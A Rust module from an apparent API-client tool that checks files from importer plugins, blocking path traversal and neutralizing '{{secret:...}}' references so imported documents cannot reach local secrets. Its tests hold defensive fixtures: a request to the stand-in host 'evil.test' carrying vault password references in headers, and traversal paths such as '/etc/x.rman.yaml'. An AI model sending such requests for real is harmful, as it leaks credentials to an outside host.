//! Validating and writing what an importer plugin returned (plugins spec,
//! "Importer extension point"). The plugin writes nothing: the host checks
//! every request file and environment against the workspace schema first,
//! and writes nothing at all when one of them is invalid.

use std::path::{Path, PathBuf};

use crate::environment::{self, ENVIRONMENTS_DIR};
use crate::error::ConfigError;
use crate::model::{KindRegistry, REQUEST_FILE_SUFFIX, Request};
use crate::plugins::{Extensions, ImportedFiles};
use crate::secrets::STATE_DIR;
use crate::secrets::provider::neutralize_references;

/// What to do with a file that already exists.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub enum OnConflict {
    #[default]
    Skip,
    Overwrite,
    /// Write next to it, as `<name>-2.rman.yaml` and so on.
    Rename,
}

/// A checked file, ready to write.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Planned {
    /// Relative to the workspace root, with `/`.
    pub path: String,
    pub content: String,
    /// The `{{secret:...}}` references of the plugin's output written
    /// escaped, as literal text (issue #95).
    pub neutralized: Vec<String>,
}

/// What happened to a planned file.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Written {
    Created(String),
    Replaced(String),
    /// Written under another name, as the file existed.
    Renamed {
        from: String,
        to: String,
    },
    /// Left as it was, as the file existed.
    Skipped(String),
}

/// Check every file of `files`: requests go under `into` (relative to the
/// workspace root, with `/`; empty for the root) and must load as a
/// built-in kind or a kind a plugin of `extensions` registers;
/// environments go under `environments/`. The first invalid file fails the
/// whole import, naming the plugin and the file.
pub fn plan(
    into: &str,
    files: &ImportedFiles,
    extensions: &dyn Extensions,
) -> Result<Vec<Planned>, String> {
    let fail = |message: String| format!("plugin {}: {message}", files.plugin);
    let mut planned = Vec::new();
    for (path, content) in &files.requests {
        let path = relative(path, REQUEST_FILE_SUFFIX).map_err(fail)?;
        let check = |text: &str| check_request(&path, text, extensions);
        let (content, neutralized) = inert(&path, content, check).map_err(fail)?;
        planned.push(Planned {
            path: join(into, &path),
            content,
            neutralized,
        });
    }
    for (path, content) in &files.environments {
        let path = relative(path, ".yaml").map_err(fail)?;
        let check = |text: &str| check_environment(&path, text);
        let (content, neutralized) = inert(&path, content, check).map_err(fail)?;
        planned.push(Planned {
            path: join(ENVIRONMENTS_DIR, &path),
            content,
            neutralized,
        });
    }
    Ok(planned)
}

/// `content` checked by `check`, with every live `{{secret:...}}`
/// reference escaped (issue #95): a plugin converts an external document,
/// which must not plant a reference to a local secret. Returns the text to
/// write and the references neutralized. The escape is made in the YAML
/// text, so a file where that cannot work (a reference in a double-quoted
/// scalar, or spelled with YAML escapes) is refused rather than written
/// with a live reference.
fn inert(
    path: &str,
    content: &str,
    check: impl Fn(&str) -> Result<(), String>,
) -> Result<(String, Vec<String>), String> {
    check(content)?;
    let mut text = content.to_owned();
    let found = neutralize_references(&mut text);
    let refuse = || {
        format!(
            "{path}: holds a secret reference ({{{{secret:...}}}}) that cannot be neutralized; \
             imported files may not reference local secrets"
        )
    };
    if !found.is_empty() {
        check(&text).map_err(|_| refuse())?;
    }
    if holds_live_reference(&text) {
        return Err(refuse());
    }
    Ok((text, found))
}

/// Whether a string of the YAML document `text` (a key or a value, as
/// parsed) still holds a live secret reference. A document that cannot be
/// read here is taken to hold one when it mentions `secret:` at all.
fn holds_live_reference(text: &str) -> bool {
    match crate::format::from_yaml::<YamlStrings>(Path::new("plugin-output.yaml"), text) {
        Ok(YamlStrings(strings)) => strings
            .into_iter()
            .any(|mut s| !neutralize_references(&mut s).is_empty()),
        Err(_) => text.contains("secret:"),
    }
}

/// Every string of a YAML document, map keys included.
struct YamlStrings(Vec<String>);

impl<'de> serde::Deserialize<'de> for YamlStrings {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        let mut strings = Vec::new();
        serde::de::DeserializeSeed::deserialize(Collect(&mut strings), deserializer)?;
        Ok(Self(strings))
    }
}

struct Collect<'a>(&'a mut Vec<String>);

impl<'de> serde::de::DeserializeSeed<'de> for Collect<'_> {
    type Value = ();

    fn deserialize<D: serde::Deserializer<'de>>(self, deserializer: D) -> Result<(), D::Error> {
        deserializer.deserialize_any(self)
    }
}

impl<'de> serde::de::Visitor<'de> for Collect<'_> {
    type Value = ();

    fn expecting(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str("any YAML value")
    }

    fn visit_str<E: serde::de::Error>(self, v: &str) -> Result<(), E> {
        self.0.push(v.to_owned());
        Ok(())
    }

    fn visit_bool<E: serde::de::Error>(self, _: bool) -> Result<(), E> {
        Ok(())
    }

    fn visit_i64<E: serde::de::Error>(self, _: i64) -> Result<(), E> {
        Ok(())
    }

    fn visit_i128<E: serde::de::Error>(self, _: i128) -> Result<(), E> {
        Ok(())
    }

    fn visit_u64<E: serde::de::Error>(self, _: u64) -> Result<(), E> {
        Ok(())
    }

    fn visit_u128<E: serde::de::Error>(self, _: u128) -> Result<(), E> {
        Ok(())
    }

    fn visit_f64<E: serde::de::Error>(self, _: f64) -> Result<(), E> {
        Ok(())
    }

    fn visit_unit<E: serde::de::Error>(self) -> Result<(), E> {
        Ok(())
    }

    fn visit_none<E: serde::de::Error>(self) -> Result<(), E> {
        Ok(())
    }

    fn visit_some<D: serde::Deserializer<'de>>(self, d: D) -> Result<(), D::Error> {
        serde::de::DeserializeSeed::deserialize(self, d)
    }

    fn visit_seq<A: serde::de::SeqAccess<'de>>(self, mut seq: A) -> Result<(), A::Error> {
        while seq.next_element_seed(Collect(&mut *self.0))?.is_some() {}
        Ok(())
    }

    fn visit_map<A: serde::de::MapAccess<'de>>(self, mut map: A) -> Result<(), A::Error> {
        while map.next_key_seed(Collect(&mut *self.0))?.is_some() {
            map.next_value_seed(Collect(&mut *self.0))?;
        }
        Ok(())
    }
}

/// `path` as plain relative parts ending in `suffix`: no absolute path, no
/// `..`, no empty part, nothing in `.rustman/`.
fn relative(path: &str, suffix: &str) -> Result<String, String> {
    let parts: Vec<&str> = path.split('/').collect();
    let bad = |part: &&str| {
        part.is_empty() || *part == "." || *part == ".." || part.contains(['\\', ':'])
    };
    if parts.iter().any(bad) || parts[0].eq_ignore_ascii_case(STATE_DIR) {
        return Err(format!("invalid file path '{path}'"));
    }
    if !path.ends_with(suffix) || path.len() == suffix.len() {
        return Err(format!("file path '{path}' must end with {suffix}"));
    }
    Ok(parts.join("/"))
}

fn join(dir: &str, path: &str) -> String {
    if dir.is_empty() {
        path.to_owned()
    } else {
        format!("{dir}/{path}")
    }
}

fn check_request(path: &str, content: &str, extensions: &dyn Extensions) -> Result<(), String> {
    let file = Path::new(path);
    let registry = KindRegistry::default().with_opaque_fallback();
    let request = registry.load(file, content).map_err(|e| e.to_string())?;
    let Request::Opaque(opaque) = request else {
        return Ok(());
    };
    let kinds: Vec<String> = extensions.kinds().into_iter().map(|k| k.name).collect();
    if !kinds.contains(&opaque.kind) {
        let mut expected: Vec<&str> = crate::model::BUILTIN_KINDS.to_vec();
        expected.extend(kinds.iter().map(String::as_str));
        return Err(format!(
            "{path}: unknown request kind '{}' (expected one of: {})",
            opaque.kind,
            expected.join(", ")
        ));
    }
    let fields = opaque.kind_fields(file).map_err(|e| e.to_string())?;
    extensions
        .validate_kind(&opaque.kind, &fields)
        .map_err(|e| format!("{path}: {e}"))
}

fn check_environment(path: &str, content: &str) -> Result<(), String> {
    let name = path.strip_suffix(".yaml").unwrap_or(path);
    if path.contains('/') || !environment::is_valid_name(name) {
        return Err(format!("invalid environment file '{path}'"));
    }
    environment::parse(Path::new(path), name, content)
        .map(drop)
        .map_err(|e| e.to_string())
}

/// Write `planned` under the workspace `root`.
pub fn write(
    root: &Path,
    planned: &[Planned],
    on_conflict: OnConflict,
) -> Result<Vec<Written>, ConfigError> {
    let mut written = Vec::new();
    for file in planned {
        let target = root.join(&file.path);
        let outcome = match (target.exists(), on_conflict) {
            (false, _) => Written::Created(file.path.clone()),
            (true, OnConflict::Skip) => {
                written.push(Written::Skipped(file.path.clone()));
                continue;
            }
            (true, OnConflict::Overwrite) => Written::Replaced(file.path.clone()),
            (true, OnConflict::Rename) => Written::Renamed {
                from: file.path.clone(),
                to: free_name(root, &file.path),
            },
        };
        let path = match &outcome {
            Written::Renamed { to, .. } => root.join(to),
            _ => target,
        };
        write_file(&path, &file.content)?;
        written.push(outcome);
    }
    Ok(written)
}

/// `<stem>-<n><suffix>` for the first `n` from 2 that names no file.
fn free_name(root: &Path, path: &str) -> String {
    let suffix = if path.ends_with(REQUEST_FILE_SUFFIX) {
        REQUEST_FILE_SUFFIX
    } else {
        ".yaml"
    };
    let stem = &path[..path.len() - suffix.len()];
    (2..)
        .map(|n| format!("{stem}-{n}{suffix}"))
        .find(|candidate| !root.join(candidate).exists())
        .expect("some name is free")
}

fn write_file(path: &PathBuf, content: &str) -> Result<(), ConfigError> {
    let io = |source| ConfigError::Io {
        path: path.clone(),
        source,
    };
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).map_err(io)?;
    }
    std::fs::write(path, content).map_err(io)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::plugins::{PluginExchange, PluginVerdict, SignOutput, SignRequest};

    struct NoKinds;

    impl Extensions for NoKinds {
        fn generate(&self, _: &str, _: &str, _: &[String]) -> Result<String, String> {
            unreachable!()
        }
        fn sign(&self, _: &str, _: &SignRequest) -> Result<SignOutput, String> {
            unreachable!()
        }
        fn check(&self, _: &str, _: &PluginExchange, _: &str) -> PluginVerdict {
            unreachable!()
        }
    }

    const REQUEST: &str = "version: 1\nkind: http\nname: one\nurl: https://api.example.com/\n";

    fn files(requests: &[(&str, &str)], environments: &[(&str, &str)]) -> ImportedFiles {
        let own = |files: &[(&str, &str)]| {
            files
                .iter()
                .map(|(p, c)| ((*p).to_owned(), (*c).to_owned()))
                .collect()
        };
        ImportedFiles {
            plugin: "soapui".into(),
            requests: own(requests),
            environments: own(environments),
        }
    }

    #[test]
    fn valid_files_are_planned_under_their_folders() {
        let env = "variables:\n  base_url: https://api.example.com\n";
        let planned = plan(
            "imported",
            &files(&[("orders/one.rman.yaml", REQUEST)], &[("dev.yaml", env)]),
            &NoKinds,
        )
        .unwrap();
        let paths: Vec<&str> = planned.iter().map(|p| p.path.as_str()).collect();
        assert_eq!(
            paths,
            ["imported/orders/one.rman.yaml", "environments/dev.yaml"]
        );
    }

    /// "Invalid output": an unregistered kind fails the whole import,
    /// naming the plugin and the request.
    #[test]
    fn an_unregistered_kind_fails_the_import() {
        let bad = "version: 1\nkind: soap\nname: two\n";
        let error = plan(
            "",
            &files(&[("one.rman.yaml", REQUEST), ("two.rman.yaml", bad)], &[]),
            &NoKinds,
        )
        .unwrap_err();
        assert_eq!(
            error,
            "plugin soapui: two.rman.yaml: unknown request kind 'soap' (expected one of: http, graphql, jsonrpc, grpc, mcp, ws, sse, kafka, mqtt, amqp, evm-call, evm-tx)"
        );
    }

    /// Issue #95: a reference the plugin copied from the source document is
    /// written escaped and listed; plain variables and escaped references
    /// are kept as they are.
    #[test]
    fn secret_references_are_neutralized() {
        let request = "version: 1\nkind: http\nname: leak\nurl: https://evil.test/{{base}}\n\
                       headers:\n\
                       - name: X-Db\n  value: pw={{secret:vault/kv/prod/db#password}}\n\
                       - name: X-Single\n  value: 'a {{secret:vault/kv/a#b}}'\n\
                       - name: X-Literal\n  value: \\{{secret:vault/kv/c#d}}\n";
        let env = "variables:\n  pw: \"{{base}}\"\n  db: '{{secret:vault/kv/prod/db#password}}'\n";
        let planned = plan(
            "",
            &files(&[("leak.rman.yaml", request)], &[("dev.yaml", env)]),
            &NoKinds,
        )
        .unwrap();
        assert_eq!(
            planned[0].neutralized,
            [
                "{{secret:vault/kv/prod/db#password}}",
                "{{secret:vault/kv/a#b}}"
            ]
        );
        assert!(
            planned[0]
                .content
                .contains("value: pw=\\{{secret:vault/kv/prod/db#password}}")
        );
        assert!(planned[0].content.contains("'a \\{{secret:vault/kv/a#b}}'"));
        assert!(
            planned[0]
                .content
                .contains("value: \\{{secret:vault/kv/c#d}}")
        );
        assert!(planned[0].content.contains("https://evil.test/{{base}}"));
        assert_eq!(
            planned[1].neutralized,
            ["{{secret:vault/kv/prod/db#password}}"]
        );
        assert!(!holds_live_reference(&planned[0].content));
        assert!(!holds_live_reference(&planned[1].content));
        let clean = plan("", &files(&[("one.rman.yaml", REQUEST)], &[]), &NoKinds).unwrap();
        assert!(clean[0].neutralized.is_empty());
        assert_eq!(clean[0].content, REQUEST);
    }

    /// A reference the YAML text cannot escape (double-quoted, or spelled
    /// with YAML escapes) refuses the import rather than writing it live.
    #[test]
    fn secret_references_that_cannot_be_escaped_are_refused() {
        for header in [
            "\"{{secret:vault/kv/prod/db#password}}\"",
            "\"\\x7B{secret:vault/kv/prod/db#password}}\"",
        ] {
            let request = format!(
                "version: 1\nkind: http\nname: leak\nurl: https://evil.test/\n\
                 headers:\n- name: X-Db\n  value: {header}\n"
            );
            let error =
                plan("", &files(&[("leak.rman.yaml", &request)], &[]), &NoKinds).unwrap_err();
            assert_eq!(
                error,
                "plugin soapui: leak.rman.yaml: holds a secret reference ({{secret:...}}) \
                 that cannot be neutralized; imported files may not reference local secrets",
                "{header}"
            );
        }
    }

    #[test]
    fn paths_stay_in_their_folder() {
        for path in [
            "../x.rman.yaml",
            "/etc/x.rman.yaml",
            "a//b.rman.yaml",
            ".rustman/x.rman.yaml",
            "a\\b.rman.yaml",
            "C:x.rman.yaml",
            "x.yaml",
            ".rman.yaml",
        ] {
            let error = plan("", &files(&[(path, REQUEST)], &[]), &NoKinds).unwrap_err();
            assert!(error.starts_with("plugin soapui: "), "{path}: {error}");
        }
        let error = plan("", &files(&[], &[("a/dev.yaml", "{}")]), &NoKinds).unwrap_err();
        assert_eq!(
            error,
            "plugin soapui: invalid environment file 'a/dev.yaml'"
        );
    }

    #[test]
    fn conflicts_skip_overwrite_or_rename() {
        let dir = tempfile::tempdir().unwrap();
        let planned = [Planned {
            path: "a/one.rman.yaml".into(),
            content: "new".into(),
            neutralized: Vec::new(),
        }];
        assert_eq!(
            write(dir.path(), &planned, OnConflict::Skip).unwrap(),
            [Written::Created("a/one.rman.yaml".into())]
        );
        assert_eq!(
            write(dir.path(), &planned, OnConflict::Skip).unwrap(),
            [Written::Skipped("a/one.rman.yaml".into())]
        );
        assert_eq!(
            write(dir.path(), &planned, OnConflict::Rename).unwrap(),
            [Written::Renamed {
                from: "a/one.rman.yaml".into(),
                to: "a/one-2.rman.yaml".into()
            }]
        );
        assert_eq!(
            write(dir.path(), &planned, OnConflict::Overwrite).unwrap(),
            [Written::Replaced("a/one.rman.yaml".into())]
        );
        assert!(dir.path().join("a/one-2.rman.yaml").exists());
    }
}
